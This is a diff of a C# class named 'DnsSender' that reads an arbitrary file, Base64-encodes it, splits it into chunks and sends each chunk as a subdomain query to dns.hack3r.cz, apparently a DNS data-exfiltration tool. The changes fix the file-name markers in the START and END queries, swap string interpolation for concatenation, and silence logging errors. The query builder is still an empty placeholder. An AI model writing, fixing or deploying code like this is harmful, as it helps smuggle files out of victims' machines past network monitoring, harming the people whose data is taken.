@@ -5,13 +5,18 @@ using System.Net.Sockets;
 
 public class DnsSender
 {
-    private readonly string logFilePath = Path.Combine(Path.GetTempPath(), "error.dns");
+    private readonly string logFilePath;
+
+    public DnsSender()
+    {
+        logFilePath = Path.Combine(Path.GetTempPath(), "error.dns");
+    }
 
     public void Soubor(string filePath)
     {
         try
         {
-            Log($"Processing file: {filePath}");
+            Log("Processing file: " + filePath);
             // Read file content and convert to Base64
             byte[] data = File.ReadAllBytes(filePath);
             string base64 = Convert.ToBase64String(data);
@@ -23,18 +28,18 @@ public class DnsSender
             string dnsfile = Path.GetFileName(filePath).Replace(".", "-");
 
             // Send DNS requests
-            SendDns("---START--- {dnsfile} ------.hack3r.cz");
+            SendDns("---START--- " + dnsfile + " ------.hack3r.cz");
             foreach (string part in parts)
             {
                 string dns = part.Replace("=", "--R") + ".hack3r.cz";
                 SendDns(dns);
             }
-            SendDns("----END---- {dnsfile}¨------.hack3r.cz");
+            SendDns("----END---- " + dnsfile + "¨------.hack3r.cz");
             Log("File processed successfully.");
         }
         catch (Exception ex)
         {
-            Log($"Error in Soubor: {ex.Message}");
+            Log("Error in Soubor: " + ex.Message);
         }
     }
 
@@ -42,7 +47,7 @@ public class DnsSender
     {
         try
         {
-            Log($"Splitting string into chunks of size {chunkSize}");
+            Log("Splitting string into chunks of size " + chunkSize);
             int length = str.Length;
             int chunkCount = (length + chunkSize - 1) / chunkSize;
             string[] chunks = new string[chunkCount];
@@ -57,7 +62,7 @@ public class DnsSender
         }
         catch (Exception ex)
         {
-            Log($"Error in SplitString: {ex.Message}");
+            Log("Error in SplitString: " + ex.Message);
             throw;
         }
     }
@@ -66,10 +71,11 @@ public class DnsSender
     {
         try
         {
-            Log($"Sending DNS request: {dnsRequest}");
-            var dnsServer = "dns.hack3r.cz";
-            var dnsEndpoint = new IPEndPoint(Dns.GetHostAddresses(dnsServer)[0], 53);
-            var dnsClient = new UdpClient();
+            Log("Sending DNS request: " + dnsRequest);
+            string dnsServer = "dns.hack3r.cz";
+            IPAddress[] addresses = Dns.GetHostAddresses(dnsServer);
+            IPEndPoint dnsEndpoint = new IPEndPoint(addresses[0], 53);
+            UdpClient dnsClient = new UdpClient();
             dnsClient.Connect(dnsEndpoint);
 
             // Construct and send DNS query
@@ -77,12 +83,12 @@ public class DnsSender
             dnsClient.Send(query, query.Length);
 
             // Optionally receive response (not used here)
-            // var response = dnsClient.Receive(ref dnsEndpoint);
+            // byte[] response = dnsClient.Receive(ref dnsEndpoint);
             Log("DNS request sent successfully.");
         }
         catch (Exception ex)
         {
-            Log($"Error in SendDns: {ex.Message}");
+            Log("Error in SendDns: " + ex.Message);
         }
     }
 
@@ -90,7 +96,7 @@ public class DnsSender
     {
         try
         {
-            Log($"Building DNS query for: {dnsRequest}");
+            Log("Building DNS query for: " + dnsRequest);
             // Implement DNS query construction logic here
             // For simplicity, this is a placeholder
             byte[] query = new byte[0];
@@ -99,13 +105,20 @@ public class DnsSender
         }
         catch (Exception ex)
         {
-            Log($"Error in BuildDnsQuery: {ex.Message}");
+            Log("Error in BuildDnsQuery: " + ex.Message);
             throw;
         }
     }
 
     private void Log(string message)
     {
-        File.AppendAllText(logFilePath, $"{DateTime.Now}: {message}{Environment.NewLine}");
+        try
+        {
+            File.AppendAllText(logFilePath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + ": " + message + Environment.NewLine);
+        }
+        catch
+        {
+            // Silently handle logging errors
+        }
     }
 }
